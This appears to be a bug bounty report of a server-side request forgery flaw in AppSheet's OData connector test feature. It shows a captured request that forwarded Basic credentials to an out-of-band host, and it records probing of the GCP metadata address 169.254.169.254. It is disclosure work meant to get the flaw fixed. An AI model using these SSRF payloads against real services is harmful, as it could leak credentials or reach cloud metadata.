## Affected URL / Feature
https://appsheet.com — OData data connector "Test" action
(Account → Add OData connection information → "OData Service Root URL")

## The Vulnerability
When the **Test** button is clicked, AppSheet's GCP backend performs a server-side
HTTP(S) request to the user-supplied "OData Service Root URL" to validate OData metadata.
No SSRF protection (IP allow/deny list, link-local/RFC1918 filtering) is applied, and the
backend HTTP client forwards the user-supplied OData credentials and an internal tracing
header to the destination. An authenticated attacker with a free AppSheet account can
point the URL at an attacker-controlled server and receive a genuine server-side request
from AppSheet's GCP backend.

## Proof — Captured Server-Side Request
Payload `https://<oob>.oast.pro`, form Username `testuser` / Password `testpass1234`,
**Test** clicked. The following request arrived from GCP IP `35.203.182.241`:

    GET /$metadata HTTP/1.1
    Host: <oob>.oast.pro
    Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8
    Accept-Encoding: gzip, deflate
    Authorization: Basic dGVzdHVzZXI6dGVzdHBhc3MxMjM0
    Traceparent: 00-211b255bb8beb7038f9d6aa505737d77-f9f0355422fff952-00

- `Authorization: Basic dGVzdHVzZXI6dGVzdHBhc3MxMjM0` decodes to `testuser:testpass1234`
  — **the OData form credentials are forwarded verbatim to the destination.**
- `Traceparent` — AppSheet's internal W3C distributed-tracing context is leaked, and
  confirms this is a real server-side request, not browser-initiated.

DNS was resolved via Google resolvers (`192.178.118.x`, AS15169); the fetch originated
from `35.203.182.241` (GCP AppSheet backend). AppSheet's error also reflected the OOB
server's response content type (`text/html; charset=utf-8`), proving the backend received
and parsed the response.

## GCP IMDS — TCP-Reachable (Risk Only, Not Exploited)
Payload `https://169.254.169.254` returns *"The SSL connection could not be established"* —
a .NET exception thrown **after** the TCP connection is opened (distinct from the
client-side block for `http://` URLs). This shows the backend opened a TCP socket to
`169.254.169.254:443` and failed only at TLS. It establishes **network-layer reachability
of the GCP metadata service from the AppSheet backend** — reported as a risk for
remediation. No IMDS path was requested, no token/metadata retrieved, no redirect chaining
or port probing performed.

## Root Cause
The backend OData HTTP client has no destination-IP validation and propagates
user-supplied credentials and internal tracing headers to arbitrary user-controlled hosts.

## Scope
`appsheet.com` matches `*.appsheet.com` — in scope. Reproducible with a free account.
